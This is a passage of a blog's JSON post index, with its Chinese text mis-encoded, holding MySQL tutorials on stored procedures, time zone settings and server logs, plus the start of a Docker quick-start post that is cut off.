æ¨¡å¼","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql å­˜å‚¨è¿‡ç¨‹å…¥é—¨","slug":"getting-started-with-mysql-stored-procedures","date":"2020-07-27T15:50:50.000Z","updated":"2020-07-27T15:51:55.775Z","comments":true,"path":"getting-started-with-mysql-stored-procedures/","link":"","permalink":"https://www.0x2beace.com/getting-started-with-mysql-stored-procedures/","excerpt":"æœ€è¿‘é¢ä¸´ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦ä½¿ç”¨Mysql å†™ä¸€æ®µå­˜å‚¨è¿‡ç¨‹ï¼Œå¯¹æ•°æ®åº“ä¸­çš„æ•°æ®è¡¨åšæ‰¹é‡æ“ä½œã€‚ åº”è¯¥ç®—æ˜¯çŸ¥è¯†ç›²åŒºäº†ï¼ŒèŠ±äº†ä¸€äº›æ—¶é—´å»å­¦ä¹ å¦‚ä½•å†™å¥½ä¸€ä¸ªå­˜å‚¨è¿‡ç¨‹ï¼Œæœ€ç»ˆä¹Ÿé¡ºåˆ©å†™å‡ºæ¥äº†ï¼Œè®°å½•ä¸€ä¸‹ã€‚","text":"æœ€è¿‘é¢ä¸´ä¸€ä¸ªéœ€æ±‚ï¼Œéœ€è¦ä½¿ç”¨Mysql å†™ä¸€æ®µå­˜å‚¨è¿‡ç¨‹ï¼Œå¯¹æ•°æ®åº“ä¸­çš„æ•°æ®è¡¨åšæ‰¹é‡æ“ä½œã€‚ åº”è¯¥ç®—æ˜¯çŸ¥è¯†ç›²åŒºäº†ï¼ŒèŠ±äº†ä¸€äº›æ—¶é—´å»å­¦ä¹ å¦‚ä½•å†™å¥½ä¸€ä¸ªå­˜å‚¨è¿‡ç¨‹ï¼Œæœ€ç»ˆä¹Ÿé¡ºåˆ©å†™å‡ºæ¥äº†ï¼Œè®°å½•ä¸€ä¸‹ã€‚ ä»¥ä¸‹ä¸¤ç‚¹æ˜¯å…¶ä¸­æ¯”è¾ƒé‡è¦çš„éƒ¨åˆ†ï¼š å…³äºå˜é‡çš„ä½¿ç”¨ åœ¨å­˜å‚¨è¿‡ç¨‹ä¸­ä½¿ç”¨åŠ¨æ€SQL è¯­å¥ å­˜å‚¨è¿‡ç¨‹ä¸­çš„å˜é‡MySQLå­˜å‚¨è¿‡ç¨‹å¸¸è§çš„å˜é‡ï¼šå±€éƒ¨å˜é‡ã€ç”¨æˆ·å˜é‡ã€ç³»ç»Ÿå˜é‡ã€‚ å±€éƒ¨å˜é‡åœ¨è¿‡ç¨‹ä½“ä¸­ï¼Œå¯ä»¥å£°æ˜å±€éƒ¨å˜é‡ï¼Œç”¨æ¥ä¸´æ—¶ä¿å­˜ä¸€äº›å€¼ã€‚ 1DECLARE var_name[, var_name] ... type [DEFAULT value]; å…¶ä¸­ï¼Œtypeä¸ºMySQLçš„æ•°æ®ç±»å‹ï¼Œå¦‚:intã€floatã€dateã€varchar(length) ã€‚ ä½¿ç”¨å±€éƒ¨å˜é‡æ—¶ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹ä¸¤ç‚¹ï¼š DECLAREç”¨æ¥å£°æ˜å±€éƒ¨å˜é‡ï¼Œä¸”DECLAREä»…è¢«ç”¨åœ¨BEGIN â€¦ ENDå¤åˆè¯­å¥é‡Œï¼Œå¹¶ä¸”å¿…é¡»åœ¨å¤åˆè¯­å¥çš„å¼€å¤´ï¼Œåœ¨ä»»ä½•å…¶å®ƒè¯­å¥ä¹‹å‰ï¼›å¯ä»¥è¢«ç”¨åœ¨åµŒå¥—çš„å—ä¸­ï¼Œé™¤äº†é‚£äº›ç”¨ç›¸åŒåå­—å£°æ˜å˜é‡çš„å—ã€‚ å¦‚æœè¦ç»™å˜é‡æä¾›ä¸€ä¸ªé»˜è®¤å€¼ï¼Œä½¿ç”¨DEFAULTå­å¥(å€¼å¯ä»¥æ˜¯å¸¸æ•°ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šä¸ºä¸€ä¸ªè¡¨è¾¾å¼)ï¼›å¦‚æœæ²¡æœ‰DEFAULTå­å¥ï¼Œåˆå§‹å€¼ä¸ºNULLã€‚ ç”¨æˆ·å˜é‡ç”¨æˆ·å˜é‡ä¸æ•°æ®åº“è¿æ¥æœ‰å…³ï¼šåœ¨å½“å‰è¿æ¥ä¸­å£°æ˜çš„å˜é‡ï¼Œåœ¨è¿æ¥æ–­å¼€çš„æ—¶å€™ï¼Œå°±ä¼šæ¶ˆå¤±ï¼›åœ¨æ­¤è¿æ¥ä¸­å£°æ˜çš„å˜é‡æ— æ³•åœ¨å¦ä¸€è¿æ¥ä¸­ä½¿ç”¨ã€‚ ç”¨æˆ·å˜é‡ä½¿ç”¨@å…³é”®å­—å»å®šä¹‰ã€‚ åœ¨å­˜å‚¨è¿‡ç¨‹ä¸­åŠ¨æ€æ‰§è¡ŒSQLå…¶å®è¿™ä¸ªç†è§£æˆä¸€å¥—æ¨¡ç‰ˆï¼Œåªè¦æŒ‰ç…§æ ‡å‡†å»æ‰§è¡Œè¿™å¥—æ¨¡ç‰ˆï¼Œå°±å¯ä»¥äº†ã€‚ 1234567891011121314151617181920212223242526272829303132333435-- è¿æ¥æ•°æ®åº“use databaseName;-- å®šä¹‰ç»“æŸç¬¦ä¸º $$delimiter $$-- åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¯¥åç§°çš„å­˜å‚¨è¿‡ç¨‹ï¼Œå¦‚æœå­˜åœ¨å°±åˆ é™¤drop procedure if exists wk;-- åˆ›å»ºæ–°çš„å­˜å‚¨è¿‡ç¨‹create procedure wk()begin -- å£°æ˜å˜é‡ declare days int default 366; declare dates int;-- å¾ªç¯ä½“WHILE days - 1 &gt; 0 DO -- ä¸ºå˜é‡èµ‹å€¼ SET dates &#x3D; DATE_FORMAT(DATE_SUB(CURDATE(), INTERVAL dayofyear(now())- days DAY), &quot;%Y%m%d&quot;); SET days &#x3D; days - 1; -- æ‹¼æ¥è¡¨å set @table_name &#x3D; CONCAT(&quot;tableName&quot;, dates); -- æ‹¼æ¥éœ€è¦æ‰§è¡ŒSQL è¯­å¥ï¼Œåé¢çš„å†…å®¹éœ€è¦æ ¹æ®å®é™…æƒ…å†µæ›¿æ¢æ‰ SET @sql &#x3D; CONCAT(&quot;ALTER TABLE &quot;, @table_name, &quot; -- éœ€è¦æ‰§è¡Œçš„SQL &quot;); -- é¢„å¤„ç†åŠ¨æ€SQL è¯­å¥ï¼Œå…¶ä¸­stmt æ˜¯ä¸€ä¸ªå˜é‡ PREPARE stmt FROM @sql; -- æ‰§è¡ŒSQL è¯­å¥ EXECUTE stmt ; -- é‡Šæ”¾prepare deallocate prepare stmt;-- ç»“æŸå¾ªç¯end WHILE;-- ç»“æŸå®šä¹‰è¯­å¥end $$delimiter ;call wk(); å¤§è‡´ä¸Šå°±æ˜¯è¿™æ ·ï¼Œè‡³æ­¤ï¼Œä¸€ä¸ªå®Œæ•´çš„Mysql å­˜å‚¨è¿‡ç¨‹å°±å®Œæˆäº†ã€‚ å¦‚ä½•åœ¨ç»ˆç«¯æ‰§è¡ŒMysql æ–‡ä»¶ï¼Ÿ SQL è„šæœ¬å‡†å¤‡å¥½äº†ï¼Œæœ‰ä¸¤ç§æ–¹å¼å¯ä»¥æ‰§è¡Œå®ƒã€‚ æ–¹å¼ä¸€ï¼šä¸è¿›å…¥Mysql ç»ˆç«¯ï¼Œç›´æ¥åœ¨å‘½ä»¤è¡Œç»ˆç«¯æ‰§è¡Œ æ–¹å¼äºŒï¼šè¿›å…¥Mysql ç»ˆç«¯ï¼Œåœ¨Mysql ç»ˆç«¯ä¸­æ‰§è¡Œ è¿™ä¸¤ç§æ–¹å¼çš„å…±åŒç‚¹å°±æ˜¯éƒ½éœ€è¦å·²çŸ¥Mysql å¯†ç ã€‚ å¯¹äºæ–¹å¼ä¸€ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æ‰§è¡Œï¼š 1mysql -u root -p &lt; .&#x2F;modify_user_table.sql å¯ä»¥æŒ‡å®šæ•°æ®åº“ï¼š 1mysql -u root -p databaseName &lt; .&#x2F;modify_user_table.sql å¯¹äºæ–¹å¼äºŒï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥æ‰§è¡Œï¼š 12345&#x2F;&#x2F; è¿›å…¥Mysql ç»ˆç«¯mysql -uroot -p &#x2F;&#x2F; æ‰§è¡ŒSQL æ–‡ä»¶source .&#x2F;modify_user_table.sql å‚è€ƒé“¾æ¥ Mysql ç»ˆç«¯æ‰§è¡ŒSQL æ–‡ä»¶ Mysql å­˜å‚¨è¿‡ç¨‹ä¸­çš„å˜é‡å®šä¹‰ Mysql ä¸­çš„å˜é‡å®šä¹‰å’Œèµ‹å€¼ Mysql å­˜å‚¨è¿‡ç¨‹ä¸­ä½¿ç”¨åŠ¨æ€SQL è¯­å¥","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql æŸ¥çœ‹ä¿®æ”¹é»˜è®¤æ—¶åŒº","slug":"mysql-view-and-modify-the-default-time-zone","date":"2020-07-25T15:43:57.000Z","updated":"2020-07-25T15:45:03.233Z","comments":true,"path":"mysql-view-and-modify-the-default-time-zone/","link":"","permalink":"https://www.0x2beace.com/mysql-view-and-modify-the-default-time-zone/","excerpt":"åœ¨ä¹‹å‰çš„ç¬”è®°ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“äº†æ—¶åŒºç›¸å…³çš„æ¦‚å¿µï¼Œä»¥åŠå¦‚ä½•åœ¨PHP è·å–è®¾ç½®é»˜è®¤æ—¶åŒºã€‚ è¿™ç¯‡ç¬”è®°å°±æ¥å­¦ä¹ ä¸€ä¸‹å¦‚ä½•åœ¨Mysql ä¸Šè·å–è®¾ç½®é»˜è®¤æ—¶åŒºã€‚","text":"åœ¨ä¹‹å‰çš„ç¬”è®°ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“äº†æ—¶åŒºç›¸å…³çš„æ¦‚å¿µï¼Œä»¥åŠå¦‚ä½•åœ¨PHP è·å–è®¾ç½®é»˜è®¤æ—¶åŒºã€‚ è¿™ç¯‡ç¬”è®°å°±æ¥å­¦ä¹ ä¸€ä¸‹å¦‚ä½•åœ¨Mysql ä¸Šè·å–è®¾ç½®é»˜è®¤æ—¶åŒºã€‚ æŸ¥çœ‹é»˜è®¤æ—¶åŒº12345678mysql&gt; show variables like &quot;%time_zone%&quot;;+------------------+--------+| Variable_name | Value |+------------------+--------+| system_time_zone | CST || time_zone | SYSTEM |+------------------+--------+2 rows in set (0.01 sec) è®¾ç½®é»˜è®¤æ—¶åŒºè®¾ç½®å½“å‰ä¼šè¯12mysql&gt; SET time_zone &#x3D; &quot;+8.00&quot;;mysql&gt; show variables like &quot;%time_zone%&quot;; æ­¤ä¿®æ”¹åªä¼šå¯¹å½“å‰ä¼šè¯æœ‰æ•ˆã€‚ å…¨å±€è®¾ç½®1mysql&gt; SET global time_zone &#x3D; &quot;+8.00&quot;; éœ€è¦é‡å¯è¯¥ä¼šè¯ï¼Œè¯¥é…ç½®æ‰ç”Ÿæ•ˆã€‚ ç¼–è¾‘ my.ini123# æ‰“å¼€Mysql çš„é…ç½®æ–‡ä»¶ my.ini[mysqld]default-time_zone &#x3D; &#39;+8:00&#39; éœ€è¦é‡å¯Mysql æœåŠ¡ æ—¶é—´æ ¼å¼GMTï¼ˆGreenwich Mean Timeï¼‰ï¼šæ ¼æ—å¨æ²»æ ‡å‡†æ—¶é—´UTCï¼šä¸–ç•Œæ ‡å‡†æ—¶é—´CSTï¼ˆChina Standard Timeï¼‰ï¼šä¸­å›½æ ‡å‡†æ—¶é—´ GMT + 8 = UTC + 8 = CST å‚è€ƒé“¾æ¥ Mysql æŸ¥çœ‹ä¿®æ”¹æ—¶åŒº time_zone","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"äº†è§£ Mysql æ—¥å¿—","slug":"understanding-the-mysql-log","date":"2020-07-25T15:38:53.000Z","updated":"2020-07-31T12:39:49.199Z","comments":true,"path":"understanding-the-mysql-log/","link":"","permalink":"https://www.0x2beace.com/understanding-the-mysql-log/","excerpt":"æ—¥å¿—æ— è®ºåœ¨å“ªé‡Œéƒ½æ˜¯å°¤ä¸ºé‡è¦çš„å­˜åœ¨ï¼Œæ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„ç›®çš„å°±æ˜¯äº†è§£Mysql æ—¥å¿—çš„ã€‚","text":"æ—¥å¿—æ— è®ºåœ¨å“ªé‡Œéƒ½æ˜¯å°¤ä¸ºé‡è¦çš„å­˜åœ¨ï¼Œæ‰€ä»¥è¿™ç¯‡ç¬”è®°çš„ç›®çš„å°±æ˜¯äº†è§£Mysql æ—¥å¿—çš„ã€‚ æ—¥å¿—ç®€ä»‹Mysql çš„æ—¥å¿—ä¸»è¦åˆ†ä¸ºå››ç±»ï¼Œä½¿ç”¨è¿™äº›æ—¥å¿—æ–‡ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹Mysql å†…éƒ¨å‘ç”Ÿçš„äº‹æƒ…ï¼Œè¿™å››ç±»æ—¥å¿—åˆ†åˆ«æ˜¯ï¼š é”™è¯¯æ—¥å¿—ï¼šè®°å½•Mysql æœåŠ¡çš„å¯åŠ¨ã€è¿è¡Œæˆ–åœæ­¢MysqlæœåŠ¡æ—¶å‡ºç°çš„é—®é¢˜ã€‚ æŸ¥è¯¢æ—¥å¿—ï¼šè®°å½•å»ºç«‹çš„å®¢æˆ·ç«¯è¿æ¥å’Œæ‰§è¡Œçš„è¯­å¥ã€‚ äºŒè¿›åˆ¶æ—¥å¿—ï¼šè®°å½•æ‰€æœ‰æ›´æ”¹æ•°æ®çš„è¯­å¥ï¼Œå¯ä»¥ç”¨äºæ•°æ®æ¢å¤ã€‚ æ…¢æŸ¥è¯¢æ—¥å¿—ï¼šè®°å½•æ‰€æœ‰æ‰§è¡Œæ—¶é—´è¶…è¿‡ long_query_time çš„æ‰€æœ‰æŸ¥è¯¢æˆ–ä¸ä½¿ç”¨ç´¢å¼•çš„æŸ¥è¯¢ã€‚ äºŒè¿›åˆ¶æ—¥å¿—äºŒè¿›åˆ¶æ—¥å¿—ä¸»è¦è®°å½• Mysql æ•°æ®åº“çš„å˜åŒ–ã€‚äºŒè¿›åˆ¶æ—¥å¿—ä»¥ä¸€ç§æœ‰æ•ˆçš„æ ¼å¼ï¼Œå¹¶ä¸”æ˜¯äº‹åŠ¡å®‰å…¨çš„æ–¹å¼åŒ…å«æ›´æ–°æ—¥å¿—ä¸­å¯ç”¨çš„æ‰€æœ‰ä¿¡æ¯ã€‚ å¯åŠ¨å’Œè®¾ç½®äºŒè¿›åˆ¶æ—¥å¿—é»˜è®¤æƒ…å†µä¸‹ï¼ŒäºŒè¿›åˆ¶æ—¥å¿—æ˜¯å…³é—­çš„ï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹mysql çš„é…ç½®æ–‡ä»¶æ¥å¯åŠ¨å’Œè®¾ç½®äºŒè¿›åˆ¶æ—¥å¿—ã€‚ é…ç½®æ–‡ä»¶ my.ini ä¸­æœ‰å‡ ä¸ªè®¾ç½®æ˜¯å…³äºäºŒè¿›åˆ¶æ—¥å¿—çš„ï¼š 1234567# å¦‚æœéœ€è¦å¯ç”¨ï¼Œå°±åœ¨ mysqld ç»„ä¸‹ï¼ŒåŠ ä¸Š log-bin é€‰é¡¹[mysqld]log-binlog-bin [&#x3D;path&#x2F; [filename] ]expire_logs_days &#x3D; 10max_binlog_size &#x3D; 100M log-binå®šä¹‰å¼€å¯äºŒè¿›åˆ¶æ—¥å¿—ï¼Œpath è¡¨ç¤ºæ—¥å¿—æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•è·¯å¾„ï¼Œfilename æŒ‡å®šäº†æ—¥å¿—æ–‡ä»¶çš„åç§°ã€‚ expire_logs_dayså®šä¹‰äº†Mysql æ¸…é™¤è¿‡æœŸæ—¥å¿—çš„æ—¶é—´ï¼Œå³äºŒè¿›åˆ¶æ—¥è‡³çš„è‡ªåŠ¨åˆ é™¤çš„å¤©æ•°ã€‚ max_binlog_sizeå®šä¹‰äº†å•ä¸ªæ–‡ä»¶çš„å¤§å°é™åˆ¶ï¼Œä¸èƒ½å°†å˜é‡è®¾ç½®ä¸ºå¤§äº1GBæˆ–è€…å°äº4096Bã€‚é»˜è®¤å€¼ä¸º1GB. å¦‚ä½•æ£€æŸ¥è‡ªå·±çš„äºŒè¿›åˆ¶æ—¥å¿—æ˜¯å¦å¼€å¯äº†å‘¢ï¼Ÿ è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š 1mysql&gt; show variables like &#39;log_%&#39;; æŸ¥çœ‹äºŒè¿›åˆ¶æ—¥å¿—æŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶ä¸ªæ•°åŠæ–‡ä»¶åï¼Œå‰ææ˜¯å¼€å¯äº†äºŒè¿›åˆ¶æ—¥å¿—ï¼š 1mysql&gt; show binary logs; åˆ é™¤äºŒè¿›åˆ¶æ—¥å¿—Mysql ä¹Ÿä¸ºæˆ‘ä»¬æä¾›äº†åˆ é™¤äºŒè¿›åˆ¶æ—¥å¿—çš„æ–¹æ³•ï¼Œæœ‰ä¸¤ç§ï¼Œä½œç”¨ä¸ç›¸åŒã€‚ åˆ é™¤æ‰€æœ‰äºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶ï¼š 1mysql&gt; RESET MASTER; åˆ é™¤æŒ‡å®šäºŒè¿›åˆ¶æ—¥å¿—æ–‡ä»¶ï¼š 12# å…¶ä¸­ï¼Œbinlog.000003 æ˜¯æŒ‡äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°mysql&gt; PURGE MASTER LOGS TO &quot;binlog.000003&quot;; ä½¿ç”¨äºŒè¿›åˆ¶æ—¥å¿—æ¢å¤æ•°æ®åº“å¦‚æœå¯ç”¨äº†Mysql çš„äºŒè¿›åˆ¶æ—¥å¿—ï¼Œåœ¨æ•°æ®åº“å‡ºç°æ„å¤–ä¸¢å¤±æ•°æ®æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ Mysqlbinlog å·¥å…·ä»æŒ‡å®šæ—¶é—´ç‚¹å¼€å§‹ï¼ˆä¾‹å¦‚ï¼Œæœ€åä¸€æ¬¡å¤‡ä»½ï¼‰ç›´åˆ°ç°åœ¨ã€‚ Mysqlbinlog æ¢å¤æ•°æ®åº“çš„è¯­æ³•å¦‚ä¸‹ï¼š 1mysql&gt; mysqlbinlog [option] filename | mysql -uuser -ppass å®ä¾‹ï¼šä½¿ç”¨Mysqlbinlog æ¢å¤Mysql æ•°æ®åº“åˆ°2019å¹´1æœˆ30æ—¥15:27:48æ—¶çš„çŠ¶æ€ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1mysqlbinlog --stop--date&#x3D;&quot;2019-01-30 15:27:48&quot; | path&#x2F;binlogfilename -uuser -ppass æš‚åœäºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½å› ä¸ºä¿®æ”¹Mysql é…ç½®æ–‡ä»¶å¯ä»¥å¯ç”¨ã€åœç”¨äºŒè¿›åˆ¶æ—¥å¿—åŠŸèƒ½ï¼Œä½†æ˜¯éœ€è¦é‡å¯Mysql æœåŠ¡å™¨ã€‚Mysql ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç§æ›´ç®€å•çš„æ–¹å¼å¯ä»¥æš‚åœè®°å½•äºŒè¿›åˆ¶æ—¥å¿—ã€‚ æš‚åœè®°å½•äºŒè¿›åˆ¶æ—¥å¿—ï¼š 1mysql&gt; SET sql_log_bin &#x3D; 0; æ¢å¤è®°å½•äºŒè¿›åˆ¶æ—¥å¿—ï¼š 1mysql&gt; SET sql_log_bin &#x3D; 1; é”™è¯¯æ—¥å¿—é”™è¯¯æ—¥å¿—æ–‡ä»¶åŒ…å«äº†å½“Mysqld å¯åŠ¨å’Œåœæ­¢æ—¶ï¼Œä»¥åŠæœåŠ¡å™¨åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿä»»ä½•ä¸¥é‡é”™è¯¯æ—¶çš„ç›¸å…³ä¿¡æ¯ã€‚é”™è¯¯æ—¥å¿—é»˜è®¤æ˜¯å¼€å¯çš„ã€‚ å¯åŠ¨å’Œè®¾ç½®é”™è¯¯æ—¥å¿—é€šè¿‡ä¿®æ”¹my.ini é…ç½®æ–‡ä»¶ï¼Œæ¥å¯ç”¨æˆ–è€…åœç”¨é”™è¯¯æ—¥å¿— 12345# å¦‚æœéœ€è¦å¯ç”¨ï¼Œå°±åœ¨ mysqld ç»„ä¸‹ï¼ŒåŠ ä¸Š log-error é€‰é¡¹[mysqld]log-errorlog-error&#x3D;[path&#x2F;filename] æŸ¥çœ‹é”™è¯¯æ—¥å¿—é¦–å…ˆä½¿ç”¨å¦‚ä¸‹å‘½ä»¤æŸ¥çœ‹é”™è¯¯æ—¥å¿—çš„å­˜å‚¨è·¯å¾„ä»¥åŠæ–‡ä»¶åï¼š 1mysql&gt; show variables like &#39;log_error&#39;; åˆ é™¤é”™è¯¯æ—¥å¿—æ–‡ä»¶Mysql çš„é”™è¯¯æ—¥å¿—æ–‡ä»¶æ˜¯ä»¥æ–‡æœ¬æ–‡ä»¶çš„å½¢å¼å­˜å‚¨åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå¯ä»¥ç›´æ¥åˆ é™¤ã€‚ 1mysql&gt; flush logs; é€šç”¨æŸ¥è¯¢æ—¥å¿—é€šç”¨æŸ¥è¯¢æ—¥å¿—è®°å½•äº†Mysql çš„æ‰€æœ‰æ“ä½œï¼ŒåŒ…æ‹¬å¯åŠ¨å’Œå…³é—­æœåŠ¡ã€æ‰§è¡ŒæŸ¥è¯¢å’Œæ›´æ–°è¯­å¥ç­‰ã€‚ å¯ç”¨å’Œè®¾ç½®é€šç”¨æŸ¥è¯¢æ—¥å¿—åŒæ ·çš„ï¼Œæ‰“å¼€Mysql çš„my.ini é…ç½®æ–‡ä»¶ã€‚ 1234[mysqld]loglog&#x3D;[path\\filename] è¿™é‡Œæœ‰ä¸¤ç§æ–¹å¼ï¼Œlog é€‰é¡¹åé¢å¦‚æœæ²¡æœ‰å¸¦ä»»ä½•å‚æ•°è¡¨ç¤ºä½¿ç”¨Mysql é»˜è®¤çš„å­˜å‚¨ä½ç½®ï¼Œä¸Šé¢çš„ä¹Ÿä¸€æ ·ã€‚ æŸ¥çœ‹é€šç”¨æŸ¥è¯¢æ—¥å¿—å¯ä»¥é€šè¿‡log è®¾ç½®çš„æ—¥å¿—æ–‡ä»¶å­˜å‚¨è·¯å¾„ï¼Œå»æŸ¥çœ‹å…·ä½“æ–‡ä»¶ã€‚ æ…¢æŸ¥è¯¢æ—¥å¿—æ…¢æŸ¥è¯¢æ—¥å¿—è®°å½•æŸ¥è¯¢æ—¶é•¿è¶…è¿‡æŒ‡å®šæ—¶é—´çš„æ—¥å¿—ã€‚é€šè¿‡æ…¢æŸ¥è¯¢æ—¥å¿—ï¼Œå¯ä»¥æ‰¾å‡ºæ‰§è¡Œæ—¶é—´è¾ƒé•¿ã€æ‰§è¡Œæ•ˆç‡è¾ƒä½çš„è¯­å¥ï¼Œç„¶åè¿›è¡Œä¼˜åŒ–ã€‚ å¯ç”¨å’Œè®¾ç½®æ…¢æŸ¥è¯¢æ—¥å¿—åŒæ ·çš„ï¼Œæ‰“å¼€ç¼–è¾‘Mysql çš„my.ini é…ç½®æ–‡ä»¶ï¼š 12345[mysqld]log-slow-querieslog-slow-queries&#x3D;[path\\filename]long_query_time&#x3D;n n è¡¨ç¤ºæŸ¥è¯¢æ—¶é—´çš„æé™å€¼ï¼Œå¦‚æœè¶…è¿‡äº†è¿™ä¸ªå€¼ï¼Œè¿™ä¸ªæŸ¥è¯¢è¿‡ç¨‹å°±ä¼šè¢«è®°å½•åˆ°æ…¢æŸ¥è¯¢æ—¥å¿—æ–‡ä»¶ä¸­ã€‚ æŸ¥è¯¢æ…¢æŸ¥è¯¢æ—¥å¿—åŒä¸Šã€‚ ä¸Šé¢è¿™äº›æ—¥å¿—é…ç½®çš„æ›´æ”¹éƒ½éœ€è¦é‡å¯æœåŠ¡å™¨æ‰èƒ½ç”Ÿæ•ˆï¼Œå¦å¤–è¿˜æœ‰ä¸€ç§æ–¹å¼å¯ä»¥æŸ¥çœ‹è¿è¡Œæ—¶æ—¥å¿—ã€‚ å¯ç”¨å®æ—¶æ—¥å¿—1234set global general_log &#x3D; on;&#x2F;&#x2F; æŸ¥çœ‹æ—¥å¿—æ–‡ä»¶ç›®å½•show variables like &#39;general_log_file&#39;; è¿™ç§æ–¹å¼çš„å¥½å¤„å°±æ˜¯ä¸éœ€è¦é‡å¯Mysql æœåŠ¡ã€‚ å¦‚æœéœ€è¦ç¦ç”¨ï¼š 1set global general_log &#x3D; off; å…³äºå¹³æ—¶åº”è¯¥æ‰“å¼€å“ªäº›æ—¥å¿—çš„é—®é¢˜ã€‚ æ—¥å¿—çš„å¼€å¯æ—¢ä¼šå½±å“Mysql çš„æ€§èƒ½ï¼Œåˆä¼šå ç”¨å¤§é‡çš„ç£ç›˜ç©ºé—´ã€‚å› æ­¤å¦‚æœä¸å¿…è¦ï¼Œåº”å°½å¯èƒ½çš„å°‘å¼€å¯æ—¥å¿—ï¼Œæ ¹æ®ä¸åŒçš„ä½¿ç”¨ç¯å¢ƒï¼Œè€ƒè™‘å¼€å¯ä¸åŒçš„æ—¥å¿—ã€‚ ä¾‹å¦‚ï¼šåœ¨å¼€å‘ç¯å¢ƒä¸­ä¼˜åŒ–æŸ¥è¯¢ä½æ•ˆç‡çš„è¯­å¥ï¼Œå¯ä»¥å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—ï¼›å¦‚æœéœ€è¦è®°å½•ç”¨çš„æ‰€æœ‰æŸ¥è¯¢æ“ä½œï¼Œå¯ä»¥å¼€å¯é€šç”¨æŸ¥è¯¢æ—¥å¿—ï¼›å¦‚æœéœ€è¦è®°å½•æ•°æ®çš„å˜æ›´ï¼Œå¯ä»¥å¼€å¯äºŒè¿›åˆ¶æ—¥å¿—ï¼›é”™è¯¯æ—¥å¿—é»˜è®¤å¼€å¯ï¼›","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Docker å¿«é€Ÿä¸Šæ‰‹","slug":"docker-quick-start","date":"2020-07-23T04:32:57.000Z","updated":"2020-08-22T01:02:14.223Z","comments":true,"path":"docker-quick-start/","link":"","permalink":"https://www.0x2beace.com/docker-quick-start/","excerpt":"è¿™ç¯‡ç¬”è®°çš„ä¸»è¦ç›®çš„æ˜¯ç”¨æ¥è®°å½•å­¦ä¹  Docker çš„è¿‡ç¨‹ã€‚Dockerè¿™ä¸ªè¯å¹¶ä¸æ˜¯ç¬¬ä¸€æ¬¡å¬è¯´äº†ï¼Œå°è±¡ä¸­å¥½ä¹…ä»¥å‰å°±å¬è¯´è¿‡è¿™ä¸ªä¸œè¥¿äº†ï¼Œåªæ˜¯ä¸€ç›´æ²¡æœ‰çœŸæ­£å»äº†è§£ã€‚","text":"è¿™ç¯‡ç¬”è®°çš„ä¸»è¦ç›®çš„æ˜¯ç”¨æ¥è®°å½•å­¦ä¹  Docker çš„è¿‡ç¨‹ã€‚Dockerè¿™ä¸ªè¯å¹¶ä¸æ˜¯ç¬¬ä¸€æ¬¡å¬è¯´äº†ï¼Œå°è±¡ä¸­å¥½ä¹…ä»¥å‰å°±å¬è¯´è¿‡è¿™ä¸ªä¸œè¥¿äº†ï¼Œåªæ˜¯ä¸€ç›´æ²¡æœ‰çœŸæ­£å»äº†è§£ã€‚ è¯ç”Ÿè½¯ä»¶å¼€å‘æœ€å¤§çš„éº»çƒ¦äº‹ä¹‹ä¸€ï¼Œå°±æ˜¯ç¯å¢ƒé…ç½®ã€‚ å¼€å‘è€…å¸¸å¸¸è¯´çš„ä¸€å¥è¯ï¼šå®ƒåœ¨æˆ‘çš„æœºå™¨ä¸Šå¯ä»¥è·‘äº†ã€‚è¨€ä¸‹ä¹‹æ„å°±æ˜¯ï¼Œå…¶ä»–æœºå™¨å¯èƒ½è·‘ä¸äº†ã€‚å› ä¸ºå¯ä»¥æ­£å¸¸è·‘çš„å‰ææ˜¯ï¼šæ“ä½œç³»ç»Ÿçš„è®¾ç½®ï¼Œå„ç§è½¯ä»¶å’Œç»„ä»¶ã€åº“çš„å®‰è£…ï¼Œåªæœ‰å®ƒä»¬éƒ½æ­£ç¡®äº†ï¼Œè½¯ä»¶æ‰èƒ½æ­£å¸¸è¿è¡Œã€‚ é…ç½®ç¯å¢ƒå¦‚æ­¤éº»çƒ¦ï¼Œæ¢ä¸€å°æœºå™¨ï¼Œå°±å¾—é‡æ¥ä¸€æ¬¡ï¼Œæ—·æ—¥è´¹æ—¶ã€‚å› æ­¤ï¼Œèªæ˜çš„äººä»¬å°±æƒ³åˆ°ï¼Œèƒ½ä¸èƒ½ä»æ 